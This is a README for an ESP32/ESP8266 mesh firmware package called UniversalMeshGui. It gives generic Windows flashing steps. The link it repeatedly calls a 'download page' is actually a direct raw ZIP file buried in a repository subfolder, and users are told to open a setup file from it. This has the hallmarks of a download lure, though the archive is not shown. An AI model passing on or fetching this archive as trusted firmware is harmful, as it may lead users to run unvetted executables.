# 📡 UniversalMeshGui - Easy Mesh Firmware Setup

[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-UniversalMeshGui-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip)

## 🔽 Download

Use this link to visit the download page:

https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip

## 🧭 What This Does

UniversalMeshGui gives you ready-to-flash firmware for mesh devices. It includes:

- Node firmware for sensor units
- Coordinator firmware for the main bridge device
- Auto-discovery between nodes and the coordinator
- ESP-NOW data transfer for fast local messaging
- Wi-Fi bridge support for your network

This setup is made for ESP32 and ESP8266 devices that use a mesh-style network. You do not need to build firmware from source to get started.

## 🖥️ What You Need

Before you start, make sure you have:

- A Windows PC
- A USB data cable
- An ESP32 or ESP8266 board
- A flash tool or browser-based upload tool if the release page includes one
- A web browser to open the download page

For best results, use a USB cable that supports data, not just charging.

## 🚀 Getting Started

1. Open the download page:
   https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip

2. Look for the latest release or download files.

3. Save the file to your Windows PC.

4. If the download is a ZIP file, right-click it and choose Extract All.

5. Open the folder and read any included notes before you flash a board.

6. Connect your ESP32 or ESP8266 board to your PC with a USB cable.

7. Open the flashing tool or setup file that comes with the download.

8. Select the correct COM port if the tool asks for it.

9. Choose the firmware file for your device type.

10. Click the flash, upload, or install button.

11. Wait until the tool finishes.

12. Unplug the board and plug it back in if the tool tells you to do that.

## 🛠️ Flashing the Coordinator

The coordinator is the main device in the mesh network. It handles the link between the mesh and your home network.

Use the coordinator firmware if you want to:

- Receive data from sensor nodes
- Bridge mesh traffic to Wi-Fi
- Keep the network organized
- Act as the main control point

Typical steps:

1. Open the coordinator firmware file.
2. Connect the coordinator board by USB.
3. Select the board type in the flashing tool.
4. Pick the right serial port.
5. Flash the firmware.
6. Restart the board after the upload finishes.

## 🌐 Flashing Sensor Nodes

Sensor nodes collect data and send it to the coordinator over ESP-NOW.

Use the node firmware if you want to:

- Send sensor readings
- Join the mesh automatically
- Work without manual pairing
- Stay on a low-power device

Typical steps:

1. Open the node firmware file.
2. Connect each sensor board one at a time.
3. Select the same board family as the device you are flashing.
4. Upload the node firmware.
5. Repeat for each node device.

If you have more than one node, flash them one after another so you can keep track of each device.

## 📶 How It Works

UniversalMeshGui uses a simple flow:

- Sensor nodes gather data
- Nodes find the coordinator on their own
- Nodes send data over ESP-NOW
- The coordinator passes data to your network

This design keeps setup simple for the user. You flash the right firmware on each board, power it on, and let it connect.

## 🔌 Device Types

This project is built for common ESP boards, including:

- ESP32 boards
- ESP8266 boards
- ESP-NOW based devices
- Mesh network nodes
- Coordinator boards with Wi-Fi access

If you are not sure which board you have, check the label on the board or the product page from where you bought it.

## 🧰 Common Setup Tips

- Use one board at a time when flashing
- Close other programs that may use the same COM port
- Keep the USB cable short and in good shape
- Use the correct board profile in the flashing tool
- If the upload fails, disconnect the board and try again

If the board has a boot button, you may need to hold it while the upload starts.

## 📁 Typical Files You May See

After you download and extract the package, you may see:

- Firmware files for the coordinator
- Firmware files for nodes
- A README or notes file
- Flashing tools or helper files
- Config files for Wi-Fi or mesh settings

Read the included notes first. They often tell you which file matches each board.

## 🔧 Suggested Windows Flow

If you are using Windows, follow this order:

1. Download the package from the link above
2. Extract the files
3. Open the folder with the firmware
4. Install or open the flashing tool
5. Connect your board by USB
6. Pick the right COM port
7. Select the firmware file
8. Flash the board
9. Disconnect and power cycle the device
10. Check the device status after restart

## 🧪 First Test After Flashing

After the flash is done:

- Power on the coordinator first
- Then power on the sensor nodes
- Watch for the nodes to join the mesh
- Check that sensor data reaches the coordinator
- Confirm your Wi-Fi network can see the bridge device

If the node does not join, restart the node and the coordinator once.

## 📌 Project Scope

UniversalMeshGui is built as a full-stack firmware set for a mesh network setup. It covers both ends of the system:

- The node side for sensing and sending data
- The coordinator side for collecting and bridging data

This makes it useful for home sensors, small automation setups, and test benches.

## 🧷 Supported Topics

This repository relates to:

- esp
- esp-now
- esp32
- esp8266
- espnow
- mesh
- pd2emc
- pd8jo
- universalmesh
- wifi

## 🧭 File Naming Guide

If you see more than one firmware file, use this rule:

- Files with coordinator in the name are for the main bridge device
- Files with node in the name are for sensor boards
- Files with esp32 in the name are for ESP32 boards
- Files with esp8266 in the name are for ESP8266 boards

When in doubt, match the file name to your board type and role.

## 🪛 Troubleshooting

If the board does not flash:

- Check the USB cable
- Try another USB port
- Make sure the COM port is correct
- Close other apps that may use the board
- Press the boot button during upload if your board needs it

If the board flashes but does not start:

- Unplug and plug it back in
- Check that you used the right firmware file
- Flash the board again
- Power the coordinator before the nodes

If nodes do not appear on the network:

- Move the node closer to the coordinator
- Restart both devices
- Make sure all devices use the same mesh setup
- Flash the node firmware again if needed

## 📝 Before You Begin

A smooth setup usually depends on three things:

- The right firmware file
- The right board type
- A working USB connection

Once those match, the process is usually straightforward on Windows

## 📎 Download Again

Visit the download page here:

https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip